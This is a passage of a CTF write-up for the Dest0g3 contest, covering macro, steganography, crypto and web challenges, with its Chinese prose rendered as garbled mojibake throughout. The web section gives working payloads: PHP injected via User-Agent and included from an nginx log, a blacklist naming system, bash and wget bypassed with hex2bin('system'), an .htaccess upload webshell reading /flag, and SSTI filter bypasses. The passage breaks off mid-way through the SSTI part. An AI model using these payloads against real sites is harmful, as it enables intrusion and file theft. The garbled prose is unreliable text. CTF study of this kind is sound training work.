123456789101112131415161718192021222324252627282930313233343536Private Sub CB_OK_Click()Dim strpasw As StringDim strdec As StringDim strusrinput As StringDim t As Stringt = ChrW(21152) &amp; ChrW(27833) &amp; ChrW(21543) &amp; ChrW(65292) &amp; ChrW(21516) &amp; ChrW(23398) &amp; ChrW(20204) &amp; ChrW(65281)strusrinput = Dialog.TextBox_PaswDim sinput As Stringsinput = strusrinputIf (strusrinput &lt;&gt; &quot;&quot;) Then strusout = Encode(strusrinput, t) If (strusout = &quot;â”¤â„¡Ç’qï½˜~&quot;) Then strdec = Decode(Dialog.Label_ls.Caption, sinput) Else If (strusout = &quot;ï½‹GJEï½‡ï½‘&quot;) Then strdec = Decode(Dialog.Label_ls1.Caption, sinput) Else If (strusout = &quot;Ğ®ÎŸopz+&quot;) Then strdec = Decode(Dialog.Label_ls2.Caption, sinput) Else If (strusout = &quot;ï½šÎšjrĞ¨Ï†Îµã‚&quot;) Then strdec = Decode(Dialog.Label_ls4.Caption, sinput) Else If (strusout = &quot;Ã Ç–tï¼µï½—â”§ï½ˆÃ¨&quot;) Then strdec = Decode(Dialog.Label_ls3.Caption, sinput) Else strdec = StrConv(t, vbFromUnicode) End If End If End If End If End If Label_CLUE.Caption = strdecEnd If æ— éœ€åˆ†æåŠ è§£å¯†ç®—æ³•ï¼Œè¾“å‡ºç»“æœ strusout ç”± Encode(strusrinput, t) åŠ å¯†å¾—åˆ°ï¼Œåªéœ€åˆ†åˆ«ç”¨è§£å¯†å‡½æ•°åæ¨äº”ä¸ªifåˆ†æ”¯æ¡ä»¶å¯¹åº”çš„æ˜æ–‡å³å¯ï¼Œä¿®æ”¹ Label_CLUE.Caption = strdec ä¸º Label_CLUE.Caption = Decode(xxx,t)ï¼Œå›åˆ°wordè¿è¡Œ AutoOpen å®ï¼Œéšä¾¿è¾“å…¥å­—ç¬¦ç‚¹å‡»ç¡®å®šå³å¯åœ¨Dialogçš„labelå¤„æ˜¾ç¤ºå¯¹åº”æ˜æ–‡ï¼Œåˆ†åˆ«æ˜¯ 123456ã€aaaaaaã€000000ã€å¢™è§’æ•°æã€iloveyouï¼› å°† Label_CLUE.Caption = Decode(xxx,t) æ”¹å› Label_CLUE.Caption = strdecï¼Œåˆ†åˆ«è¾“å…¥äº”æ®µæ˜æ–‡ï¼Œå‘ç°è¾“å…¥ å¢™è§’æ•°æ å¾—åˆ° è§£å‹å¯†ç ï¼šä¸¤åªé»„é¹‚é¸£ç¿ æŸ³,ä¸€è¡Œç™½é¹­ä¸Šé’å¤©!ï¼Œç»“åˆwordé‡Œçš„hint Rarå¯†ç ä¸ºå¤æ‚å‹ï¼Œé•¿åº¦ä¸º16ä½ï¼ŒåŒ…å«äº†å­—æ¯ã€æ•°å­—å’Œç¬¦å·ã€‚ï¼Œå‹ç¼©åŒ…å¯†ç çŒœå‡ºä¸º 2zhlmcl,1hblsqt.ï¼Œè§£å‹æ‹¿åˆ°flagï¼šDest0g3&#123;VBScr1pt_And_Hashc4t_1s_g00d&#125;ã€‚ â€‹ 4096 Just relax and always be aware of the changes on the web! 4096å°æ¸¸æˆï¼ŒæŸ¥çœ‹jsï¼Œç”¨chromeæºä»£ç é‡Œçš„æœç´¢åŠŸèƒ½ï¼Œæœ flag å¯åœ¨ local_storage_manager.js é‡Œæ‰¾åˆ° 12345function getPartFlag(score) &#123; if (score &gt; 10000) &#123; console.log(&quot;Q29uZ3JhdHVsYXRpb25zLCB0aGlzIGlzIHBhcnQgb2YgdGhlIGZsYWc6IE5HVmxOeTFpTmpjekxUazNNV1E0TVdZNFlqRTNOMzA9Lg==&quot;); &#125;&#125; ä¸¤æ¬¡base64è§£ç å¾—åˆ°flagååŠéƒ¨åˆ† 4ee7-b673-971d81f8b177&#125;ã€‚ å‰åŠéƒ¨åˆ†åœ¨jså†…æ‰¾å¾ˆä¹…éƒ½æ²¡æ‰¾åˆ°ï¼Œè§‚å¯Ÿèµ„æºæ–‡ä»¶é‡Œå­˜åœ¨ favicon.ico å’Œ favicon.png ä¸¤å¼ å›¾ï¼Œå–å‡ºæ¥å‘ç°pngå›¾æœ‰éšå†™ï¼Œforemoståˆ†å‡ºä¸€ä¸ªwavæ–‡ä»¶å’Œä¸€ä¸ªzipæ–‡ä»¶ï¼› ç”¨audacityæŸ¥çœ‹wavï¼Œå‰åä¸¤æ®µæ˜¯DTMFæŒ‰é”®éŸ³ï¼Œè§£ç å‡º 74958097831ï¼Œä¸­é—´ä¸€æ®µæ˜¯SSTVæ…¢æ‰«æç”µè§†ï¼Œç”¨robot36æ‰«å‡ºå›¾ç‰‡ï¼Œå†…å®¹æ˜¯ MD5&#123;cell phone number&#125;ï¼Œå°†å‰é¢çš„ 74958097831 å€’åºæˆæ‰‹æœºå·æ ¼å¼ï¼ŒMD5åŠ å¯†å¾—åˆ° 32fc1b5487cb447f792a19418b92544eï¼Œè§£å‹zipå‹ç¼©åŒ…ï¼› å‹ç¼©åŒ…é‡Œä¸ºåˆ‡å‰²åæ‰“ä¹±æ‹¼æ¥çš„å›¾ç‰‡ï¼Œåˆ©ç”¨gapså·¥å…·æ‹¼å›¾ gaps --image=puzzle.png --size=64 --save å¾—åˆ°çš„ç»“æœè¿˜æ˜¯æœ‰éƒ¨åˆ†å—ä½ç½®ä¸å¯¹ï¼Œå†gapsä¸¤æ¬¡å¾—åˆ°å®Œæ•´åŸå›¾ï¼š å°†å­—ç¬¦ä¸²æ‹¼æ¥å¾— RGVzdDBnM3tlZDRkMTE0Zi05ZWU0LQ==ï¼Œbase64è§£ç å¾—flagå‰åŠæ®µï¼šDest0g3&#123;ed4d114f-9ee4-ã€‚ â€‹ Python_jail å¬è¯´pythonæ˜¯æœ€å¥½çš„è¯­è¨€ï¼Œé‚£æˆ‘æŠŠå®ƒé”èµ·æ¥ï¼Œæˆ‘å°±æ˜¯æœ€å¥½çš„è¯­è¨€äº†ï¼ æ ¹æ®hintæç¤ºï¼Œpasswordé‡Œå†…å®¹æ˜¯whitespaceè¯­è¨€ï¼Œåœ¨çº¿ç¼–è¯‘å¾—åˆ° a8e15220-7404-4269-812e-6418557b7dc2ï¼Œæ˜¯zipå‹ç¼©åŒ…å¯†ç ï¼› è§£å‹zipå‹ç¼©åŒ…ï¼Œzstegå‘ç°lsbéšå†™pycæ–‡ä»¶ï¼Œæå–ï¼š zsteg -E &quot;b1,rgb,lsb,xy&quot; SECRET1.png &gt; out.pyc æ— éœ€åç¼–è¯‘ï¼Œ16è¿›åˆ¶æŸ¥çœ‹å‘ç° ZmxhZ3tiNWJjZmM4Ny01Y2E2LTQzZjEtYjM4NC01N2QwOWI4ODZjYTl9ï¼Œbase64è§£ç å¾— flag&#123;b5bcfc87-5ca6-43f1-b384-57d09b886ca9&#125;ã€‚ â€‹ codegame Funny and ez codegame with Key to celebrate EDG KEYcodeé‡Œç»æŸ¥æ˜¯LOLCODE Languageï¼Œç”¨dcodeè§£å¾—åˆ°è¾“å‡ºæ˜¯ QEFPFPQEBMXPPTLOAï¼Œä»¥æ­¤ä¸ºå¯†ç è§£å‹zipå‹ç¼©åŒ…ï¼Œå¾—åˆ°wordæ–‡ä»¶ï¼› ç›´æ¥æ‰“å¼€wordå‘ç° AES æç¤ºï¼Œç”¨å‹ç¼©åŒ…æ‰“å¼€wordæœ‰ä¸ª fllllllllll1ag.txt æ–‡ä»¶ï¼Œé‡Œé¢æ˜¯ä¸€ä¸²emojiè¡¨æƒ…ï¼ŒçŒœæƒ³ä¸ºemoji-aesåŠ å¯†ï¼Œåœ¨çº¿è§£å¯†ï¼ŒåŒæ ·ç”¨ QEFPFPQEBMXPPTLOA ä½œä¸ºkeyï¼Œæ²¡æˆåŠŸï¼Œå†ä¸æ–­ç›²è°ƒRotationï¼Œåœ¨Rotationä¸º4çš„æ—¶å€™è§£å¯†æˆåŠŸï¼Œå¾—åˆ° 666C61677B39663638663333342D303137612D343230312D393264662D6464646363313435333334647D 16è¿›åˆ¶è½¬å­—ç¬¦ä¸²å¾— flag&#123;9f68f334-017a-4201-92df-dddcc145334d&#125;ã€‚ â€‹ rookie hacker-2 ï¼ˆå®¹å™¨1çš„å®¹å™¨åä¸º test_docker1ï¼Œå®¹å™¨2çš„å®¹å™¨åä¸º test_docker2ï¼‰ Aliceè®¿é—®è‡ªå·±çš„dockeræ—¶å¿˜è®°äº†æŠŠå®¹å™¨åˆ†åˆ«éƒ¨ç½²åœ¨å“ªäº›ipä¸Šï¼Œä½ èƒ½å¸®å¸®ä»–ä¹ˆï¼Ÿ Flagæ ¼å¼ï¼šDest0g3{ip1_ip2_â€¦..} ä¾‹ï¼šå‡è®¾å®¹å™¨1ã€å®¹å™¨2çš„ipä¸º1.1.1.1ã€2.2.2.2ï¼Œåˆ™flagä¸º Dest0g3{1.1.1.1_2.2.2.2} éé¢„æœŸï¼Œdockerçš„IPåœ°å€ä¼šä»¥ &quot;IPAddress&quot;: &quot;172.x.x.x&quot; çš„å½¢å¼è®°å½•åœ¨é…ç½®æ–‡ä»¶ä¸­ï¼Œç›´æ¥åœ¨E01æ–‡ä»¶é‡Œç”¨æ­£åˆ™è¡¨è¾¾å¼ &quot;IPAddress&quot;:&quot;172 æœç´¢ï¼Œå–å‡ºç°é¢‘ç‡æœ€é«˜çš„ä¸¤ä¸ªIPå³å¯ï¼Œflagï¼šDest0g3&#123;172.18.0.2_172.18.0.3&#125;ã€‚ â€‹ CRYPTObabyRSA 123456789101112131415from Crypto.Util.number import bytes_to_long, getPrimefrom gmpy2 import next_primep = getPrime(1024)q = next_prime(p)n = p*qflag = open(&#x27;flag.txt&#x27;, &#x27;rb&#x27;).read()m = bytes_to_long(flag)e = 65537c = pow(m, e, n)print(n)print(c)&#x27;&#x27;&#x27;2727241093749761542918401733543736746628898149858580339856145630001944770200140316588520093651017398038048982882852398338873002610186588452067987267156953210170846934456215571897422219668454400307176562513448963233141401155553613028910682273254490450242872713349823916132462569827038171564033211138146581362190846531107667833769581912417863873701584094122334217656345818191886564170128296545570579045665843164163247078768938971464352896803751926514491946540256195901479832490801094763283428169863884868363211362378830392193990816845049219767176116700985531282036442764829649457179429810554375814106591525767430508126714181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854&#x27;&#x27;&#x27; $p,q$ ç›¸è¿‘ï¼Œå¸¸è§„RSAï¼š 1234567891011121314from gmpy2 import *n = e = c = p = iroot(n,2)[0]while not is_prime(p): p += 1q = n // pd = invert(e, (p-1)*(q-1))m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# b&#x27;Dest0g3&#123;96411aad-032c-20a8-bc43-b473f6f08536&#125;&#x27; â€‹ babyAES 1234567891011121314151617from Crypto.Cipher import AESimport osiv = os.urandom(16)key = os.urandom(16)my_aes = AES.new(key, AES.MODE_CBC, iv)flag = open(&#x27;flag.txt&#x27;, &#x27;rb&#x27;).read()flag += (16 - len(flag) % 16) * b&#x27;\\x00&#x27;c = my_aes.encrypt(flag)print(c)print(iv)print(key)&#x27;&#x27;&#x27;b&#x27;C4:\\x86Q$\\xb0\\xd1\\x1b\\xa9L\\x00\\xad\\xa3\\xff\\x96 hJ\\x1b~\\x1c\\xd1y\\x87A\\xfe0\\xe2\\xfb\\xc7\\xb7\\x7f^\\xc8\\x9aP\\xdaX\\xc6\\xdf\\x17l=K\\x95\\xd07&#x27;b&#x27;\\xd1\\xdf\\x8f)\\x08w\\xde\\xf9yX%\\xca[\\xcb\\x18\\x80&#x27;b&#x27;\\xa4\\xa6M\\xab&#123;\\xf6\\x97\\x94&gt;hK\\x9bBe]F&#x27;&#x27;&#x27;&#x27; AES-CBCè§£å¯†ï¼š 12345678910from Crypto.Cipher import AESc = b&#x27;C4:\\x86Q$\\xb0\\xd1\\x1b\\xa9L\\x00\\xad\\xa3\\xff\\x96 hJ\\x1b~\\x1c\\xd1y\\x87A\\xfe0\\xe2\\xfb\\xc7\\xb7\\x7f^\\xc8\\x9aP\\xdaX\\xc6\\xdf\\x17l=K\\x95\\xd07&#x27;iv = b&#x27;\\xd1\\xdf\\x8f)\\x08w\\xde\\xf9yX%\\xca[\\xcb\\x18\\x80&#x27;key = b&#x27;\\xa4\\xa6M\\xab&#123;\\xf6\\x97\\x94&gt;hK\\x9bBe]F&#x27;my_aes = AES.new(key, AES.MODE_CBC, iv)m = my_aes.decrypt(c)print(m)# b&#x27;Dest0g3&#123;d0e5fa76-e50f-76f6-9cf1-b6c2d576b6f4&#125;\\x00\\x00\\x00&#x27; â€‹ ezDLP 1234567891011from Crypto.Util.number import *flag = open(&#x27;flag.txt&#x27;, &#x27;rb&#x27;).read()x = bytes_to_long(flag)g = 19p = 335215034881592512312398694238485179340610060759881511231472142277527176340784432381542726029524727833039074808456839870641607412102746854257629226877248337002993023452385472058106944014653401647033456174126976474875859099023703472904735779212010820524934972736276889281087909166017427905825553503050645575935980580803899122224368875197728677516907272452047278523846912786938173456942568602502013001099009776563388736434564541041529106817380347284002060811645842312648498340150736573246893588079033524476111268686138924892091575797329915240849862827621736832883215569687974368499436632617425922744658912248644475097139485785819369867604176912652851123185884810544172785948158330991257118563772736929105360124222843930130347670027236797458715653361366862282591170630650344062377644570729478796795124594909835004189813214758026703689710017334501371279295621820181402191463184275851324378938021156631501330660825566054528793444353h = pow(g, x, p)print(h)&#x27;&#x27;&#x27;199533304296625406955683944856330940256037859126142372412254741689676902594083385071807594584589647225039650850524873289407540031812171301348304158895770989218721006018956756841251888659321582420167478909768740235321161096806581684857660007735707550914742749524818990843357217489433410647994417860374972468061110200554531819987204852047401539211300639165417994955609002932104372266583569468915607415521035920169948704261625320990186754910551780290421057403512785617970138903967874651050299914974180360347163879160470918945383706463326470519550909277678697788304151342226439850677611170439191913555562326538607106089620201074331099713506536192957054173076913374098400489398228161089007898192779738439912595619813699711049380213926849110877231503068464392648816891183318112570732792516076618174144968844351282497993164926346337121313644001762196098432060141494704659769545012678386821212213326455045335220435963683095439867976162&#x27;&#x27;&#x27; DLPæ±‚è§£ï¼š 12345678# Sageg = 19p = h = x = discrete_log(mod(h,p),mod(g,p))print(bytes.fromhex(hex(x)[2:]))# b&#x27;Dest0g3&#123;07ed2a6f-182f-a05d-c81e-1318af820a78&#125;&#x27; â€‹ ezStream 1234567891011121314151617181920212223242526272829303132333435363738from Crypto.Util.number import *f = open(&#x27;flag.txt&#x27;, &#x27;r&#x27;)flag = f.read()f.close()assert flag[:8] == &quot;Dest0g3&#123;&quot;class LCG: def __init__(self): self.a = getRandomNBitInteger(32) self.b = getRandomNBitInteger(32) self.m = getPrime(32) self.seed = getRandomNBitInteger(32) def next(self): self.seed = (self.a * self.seed + self.b) % self.m return self.seed &gt;&gt; 16 def output(self): print(&quot;a = &#123;&#125;\\nb = &#123;&#125;\\nm = &#123;&#125;&quot;.format(self.a, self.b, self.m)) print(&quot;state1 = &#123;&#125;&quot;.format(self.next())) print(&quot;state2 = &#123;&#125;&quot;.format(self.next()))lcg = LCG()lcg.output()c = b&#x27;&#x27;.join([long_to_bytes(ord(flag[i]) ^ (lcg.next() % 10)) for i in range(len(flag))])print(bytes_to_long(c))&#x27;&#x27;&#x27;a = 3939333498b = 3662432446m = 2271373817state1 = 17362state2 = 20624600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878&#x27;&#x27;&#x27; LCGï¼Œçˆ†ç ´æ±‚seedï¼š 123456789101112131415161718a = 3939333498b = 3662432446m = 2271373817state1 = 17362state2 = 20624c = 600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878c = list(bytes.fromhex(hex(c)[2:]))for i in range(65536): s1 = (state1&lt;&lt;16)+i s2 = (a*s1+b) % m if s2&gt;&gt;16 == state2: seed = ((s1-b)*inverse_mod(a,m))%m print(seed) # 1315807869# 710396196# 104984523 ä¸‰ä¸ªç»“æœåˆ†åˆ«ä»£å…¥æ±‚è§£ï¼š 123456789101112131415161718192021222324252627c = 600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878c = list(bytes.fromhex(hex(c)[2:]))seed = [1315807869,710396196,104984523]for k in seed: class LCG: def __init__(self): self.a = 3939333498 self.b = 3662432446 self.m = 2271373817 self.seed = k def next(self): self.seed = (self.a * self.seed + self.b) % self.m return self.seed &gt;&gt; 16 lcg = LCG() lcg.next() lcg.next() flag = &#x27;&#x27; for i in range(len(c)): flag += chr(c[i] ^^ (lcg.next() % 10)) print(flag) # Bcpp7`;&#123;e84m559&gt;$l52o(e89: g5bl-kfg376077b26|# Iosr2f;b02g6883(c59a%`5=6&quot;`4oi-ga`645;3&lt;d26&#125;# Dest0g3&#123;f21c7180-c35e-f912-e4bc-bfd235759a25&#125; â€‹ Mr.Doctor 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from Crypto.Util.number import *from hashlib import sha256import stringtable = string.ascii_letters + string.digitsflag = open(&#x27;flag.txt&#x27;, &#x27;rb&#x27;).read()[8:-1]seed = getRandomNBitInteger(40)class SHA256: def __init__(self): self.proof = [] self.sha = 0 self.sha_flag = [] def encryption(self): for i in range(len(flag) // 4): self.proof.append(flag[4 * i:4 + 4 * i]) self.sha = sha256(self.proof[i]).hexdigest().encode() self.sha_flag.append(bytes_to_long(self.sha)) return self.sha_flagclass RHODES_ELITE: def __init__(self): self.Doctor = getPrime(64) self.Amiya = getRandomNBitInteger(40) self.Rosmontis = getRandomNBitInteger(40) self.Blaze = getRandomNBitInteger(40) self.seed = seed def next(self): self.seed = (self.Amiya * self.seed * self.seed + self.Rosmontis * self.seed + self.Blaze) % self.Doctor return self.seed &gt;&gt; 12 def output(self): print(&quot;Amiya = &quot;, self.Amiya) print(&quot;Rosmontis = &quot;, self.Rosmontis) print(&quot;Blaze = &quot;, self.Blaze) print(&quot;Doctor = &quot;, self.Doctor)sha = SHA256()sha_flag = sha.encryption()elite = RHODES_ELITE()elite.output()print(&quot;Ash = &quot;, elite.next())print(&quot;SliverAsh = &quot;, elite.next())W = b&#x27;&#x27;.join([long_to_bytes(sha_flag[i] % (seed ** 3) ^ (elite.next() % 100)) for i in range(len(sha_flag))])print(bytes_to_long(W))&#x27;&#x27;&#x27;Amiya = 956366446278Rosmontis = 1061992537343Blaze = 636205571590Doctor = 18068433704538283397Ash = 1097363493609113SliverAsh = 20514313441603271920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084&#x27;&#x27;&#x27; äºŒé˜¶LCG + 4ä½ä¸€è½®çˆ†ç ´ï¼Œç”¨äºŒå…ƒCoppersmithæ–¹æ³•æ±‚seedï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import itertoolsdef small_roots(f, bounds, m=1, d=None): if not d: d = f.degree() R = f.base_ring() N = R.cardinality() f /= f.coefficients().pop(0) f = f.change_ring(ZZ) G = Sequence([], f.parent()) for i in range(m + 1): base = N ^ (m - i) * f ^ i for shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1 / factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B * monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return [] a = 956366446278b = 1061992537343c = 636205571590p = 18068433704538283397state1 = 1097363493609113state2 = 2051431344160327PR.&lt; s1_low, s2_low &gt; = PolynomialRing(Zmod(p))f = a * ((state1 &lt;&lt; 12) + s1_low) ^ 2 + b * ((state1 &lt;&lt; 12) + s1_low) + c - (state2 &lt;&lt; 12) - s2_lowstate1 = small_roots(f, (2 ^ 28, 2 ^ 28), m=3)[0][0] + (state1 &lt;&lt; 12)state2 = small_roots(f, (2 ^ 28, 2 ^ 28), m=3)[0][1] + (state2 &lt;&lt; 12)P.&lt;x&gt; = PolynomialRing(Zmod(p))f = a * x * x + b * x + c - state1seed = f.monic().roots()[1][0]print(seed)# 626844643882 ä»£å…¥é€4ä½çˆ†ç ´flagï¼š 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforceclass lcg: def __init__(self): self.p = 18068433704538283397 self.a = 956366446278 self.b = 1061992537343 self.c = 636205571590 self.seed = 626844643882 def next(self): self.seed = (self.a * self.seed * self.seed + self.b * self.seed + self.c) % self.p return self.seed &gt;&gt; 12l = lcg()seed = l.seedl.next()l.next()c = 1920358673646340365826516899186299898354902389402251443712585240681673718967552394250439615271108958695077816395789102908554482423707690040360881719002797624203057223577713119411615697309430781610828105111854807558984242631896605944487456402584672441464316236703857236007195673926937583757881853655505218912262929700452404084c = hex(c)[2:].rjust(9*30,&#x27;0&#x27;)table = &#x27;0123456789abcdef-&#x27;def pow(nowc): print(nowc) t=l.next() print(t) return mbruteforce(lambda x: hex(int(sha256(x).hexdigest().encode(&#x27;hex&#x27;),16)%(seed**3)^(t%100))[2:].rjust(30,&#x27;0&#x27;) == nowc, table, length=4, method=&#x27;fixed&#x27;) flag = &#x27;&#x27;for i in range(9): flag += pow(c[30*i:30*(i+1)])print(flag)# d2a4d1af-8a80-8794-99ac-635f89494cac â€‹ Bag 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import gmpy2from Crypto.Util.number import *from secret import flagmessage = bytes_to_long(flag[8:-1])Baglenth=286Bag=[]Bag=Bag[::-1]m=372992427307339981616536686110115630075342113098010788080347982669869622759400031649792w=274062421102700155372289583695782343443assert gmpy2.gcd(m,w)==1h=0j=0if m.bit_length()%2==0: h=m.bit_length() j=int(h//2)else: h=m.bit_length() j=int(h//2+1)def pad(m,lenth): while len(m)&lt;lenth: m=&#x27;0&#x27;+m return mdef keygen(): pk=[] sk=[] sk.append(m) sk.append(int(gmpy2.invert(w,m))) D=[] binD=[] for i in range(Baglenth): di=(w*Bag[i])%m D.append(di) bindi=bin(di)[2:] bindi=pad(bindi,h) binD.append(bindi) U=[] V=[] for i in range(Baglenth): tempu=int(str(binD[i][:j]),2) U.append(tempu) tempv=int(str(binD[i][j:]),2) V.append(tempv) e=gmpy2.next_prime(sum(V))+2 f=gmpy2.next_prime(sum(U)) assert gmpy2.gcd(e,f)==1 sk.append(int(e)) sk.append(int(f)) for i in range(Baglenth): ai=e*U[i]+f*V[i] pk.append(int(ai)) return pk,skPk,Sk=keygen()print(Pk)print(Sk)def Encrypt(plain,pk): mbin=bin(plain)[2:] c=0 mbin=pad(mbin,Baglenth) for i in range(Baglenth): c=c+int(mbin[i])*pk[i] return cc=Encrypt(message,Pk)print(c) èƒŒåŒ…å¯†ç ç³»ç»Ÿï¼ŒLLLç®—æ³•è§£ã€‚ 12345678910111213141516171819202122232425262728# Sageimport binasciipubKey = []nbit = len(pubKey)encoded = A = Matrix(ZZ, nbit + 1, nbit + 1)for i in range(nbit): A[i, i] = 1for i in range(nbit): A[i, nbit] = pubKey[i]A[nbit, nbit] = -int(encoded)res = A.LLL()for i in range(0, nbit + 1): M = res.row(i).list() flag = True for m in M: if m != 0 and m != 1: flag = False break if flag: print(i, M) M = &#x27;&#x27;.join(str(j) for j in M) M = M[:-1] M = hex(int(M, 2))[2:] print(bytes.fromhex(M)) b&#x27;5090ea29-8cb6-4ad8-ab43-1e6f65cc8eeb&#x27; â€‹ WEBphpdest 123456&lt;?phphighlight_file(__FILE__);require_once &#x27;flag.php&#x27;;if(isset($_GET[&#x27;file&#x27;])) &#123; require_once($_GET[&#x27;file&#x27;]);&#125; æ–‡ä»¶åŒ…å«ï¼Œç»• require_onceï¼Œburpsuiteæˆ– curl -A ä¿®æ”¹User-Agentä¸º &lt;?php show_source(&quot;flag.php&quot;);?&gt;ï¼Œ ç„¶åç”¨æ—¥å¿—åŒ…å« ?file=/var/log/nginx/access.log å¾—åˆ°flagã€‚ â€‹ EasyPHP Post something 12345678910111213141516171819&lt;?phphighlight_file(__FILE__);include &quot;fl4g.php&quot;;$dest0g3 = $_POST[&#x27;ctf&#x27;];$time = date(&quot;H&quot;);$timme = date(&quot;d&quot;);$timmme = date(&quot;i&quot;);if(($time &gt; &quot;24&quot;) or ($timme &gt; &quot;31&quot;) or ($timmme &gt; &quot;60&quot;))&#123; echo $fl4g;&#125;else&#123; echo &quot;Try harder!&quot;;&#125;set_error_handler( function() use(&amp;$fl4g) &#123; print $fl4g; &#125;);$fl4g .= $dest0g3;?&gt; å¼‚å¸¸å¤„ç†å‡½æ•° use() ä¸­è¾“å‡ºflagï¼Œä¼ å‚æ—¶ä¼ å…¥æ•°ç»„å³å¯è§¦å‘å¼‚å¸¸ï¼šctf[]=1ã€‚ â€‹ SimpleRCE 1234567&lt;?phphighlight_file(__FILE__);$aaa=$_POST[&#x27;aaa&#x27;];$black_list=array(&#x27;^&#x27;,&#x27;.&#x27;,&#x27;`&#x27;,&#x27;&gt;&#x27;,&#x27;&lt;&#x27;,&#x27;=&#x27;,&#x27;&quot;&#x27;,&#x27;preg&#x27;,&#x27;&amp;&#x27;,&#x27;|&#x27;,&#x27;%0&#x27;,&#x27;popen&#x27;,&#x27;char&#x27;,&#x27;decode&#x27;,&#x27;html&#x27;,&#x27;md5&#x27;,&#x27;&#123;&#x27;,&#x27;&#125;&#x27;,&#x27;post&#x27;,&#x27;get&#x27;,&#x27;file&#x27;,&#x27;ascii&#x27;,&#x27;eval&#x27;,&#x27;replace&#x27;,&#x27;assert&#x27;,&#x27;exec&#x27;,&#x27;$&#x27;,&#x27;include&#x27;,&#x27;var&#x27;,&#x27;pastre&#x27;,&#x27;print&#x27;,&#x27;tail&#x27;,&#x27;sed&#x27;,&#x27;pcre&#x27;,&#x27;flag&#x27;,&#x27;scan&#x27;,&#x27;decode&#x27;,&#x27;system&#x27;,&#x27;func&#x27;,&#x27;diff&#x27;,&#x27;ini_&#x27;,&#x27;passthru&#x27;,&#x27;pcntl&#x27;,&#x27;proc_open&#x27;,&#x27;+&#x27;,&#x27;cat&#x27;,&#x27;tac&#x27;,&#x27;more&#x27;,&#x27;sort&#x27;,&#x27;log&#x27;,&#x27;current&#x27;,&#x27;\\\\&#x27;,&#x27;cut&#x27;,&#x27;bash&#x27;,&#x27;nl&#x27;,&#x27;wget&#x27;,&#x27;vi&#x27;,&#x27;grep&#x27;);$aaa = str_ireplace($black_list,&quot;hacker&quot;,$aaa);eval($aaa);?&gt; é»‘åå•ç»•è¿‡rceï¼Œç”¨16è¿›åˆ¶ç¼–ç ç»•è¿‡ï¼šaaa=hex2bin(&#39;73797374656d&#39;)(&#39;uniq /f*&#39;); â€‹ funny_uploadæ–‡ä»¶ä¸Šä¼ åç¼€ç™½åå•ç»•è¿‡ï¼Œåˆ©ç”¨.htaccessæ–‡ä»¶å®ç°éPHPæ–‡ä»¶è§£ææˆPHPä»£ç æ‰§è¡Œã€‚ å…ˆä¸Šä¼  .htaccess æ–‡ä»¶ï¼Œç”±äºæ–‡ä»¶ä¸­ä¸èƒ½åŒ…å« &lt;? ï¼Œç”¨PHPä¼ªåè®®base64è§£ç å¤„ç†ï¼š 12AddType application/x-httpd-php .xxxphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.xxx&quot; å†ä¸Šä¼ base64ç¼–ç åçš„ shell.xxx æ–‡ä»¶ï¼š 1PD9waHAgcHJpbnRfcihmaWxlX2dldF9jb250ZW50cygnL2ZsYWcnKSk7 è®¿é—® shell.xxxï¼Œå…¶ä¸­å†…å®¹ &lt;?php print_r(file_get_contents(&#39;/flag&#39;)); ä»¥PHPä»£ç æ‰§è¡Œï¼Œå¾—åˆ°flagã€‚ â€‹ EasySSTIç™»å½•æ¡†éšä¾¿è¾“å…¥è´¦å·å¯†ç ï¼Œè¿›å…¥ Hello xxx ç•Œé¢ï¼Œå°è¯•æ›´æ¢è´¦å·ä¸º &#123;&#123;2*3&#125;&#125;ï¼Œå‡ºç° Hello 6ï¼Œå¯åˆ©ç”¨SSTIæ³¨å…¥rceã€‚ Fuzzå‘ç°è¿‡æ»¤äº†å¾ˆå¤šç¬¦å·ï¼ŒåŒ…æ‹¬ request _ &#39; &quot; [ . ç©ºæ ¼ class getitem import ç­‰ï¼Œä¸è¿‡ config å¯ç”¨ï¼Œå¯ä» &#123;&#123;config&#125;&#125; å†…å®¹å­—ç¬¦ä¸²ä¸­æ‰¾åˆ°æ‰€éœ€å­—ç¬¦æ¥æ‹¼æ¥æ„é€ å­—ç¬¦ä¸²ï¼Œå¯ä»¥é¿å…ç”¨åˆ°å¼•å·ï¼›è¿‡æ»¤çš„å…³é”®è¯ä½¿ç”¨ dict(cla=aa,ss=bb)|join() å½¢å¼ç»•è¿‡ï¼š 123456789101112131415# _config|list()|last()|string()|list()|attr(dict(p=aa,op=bb)|join())(3)# ç©ºæ ¼config|string()|list()|attr(dict(p=aa,op=bb)|join())(7)# /config|string()|list()|attr(dict(p=aa,op=bb)|join())(279)# 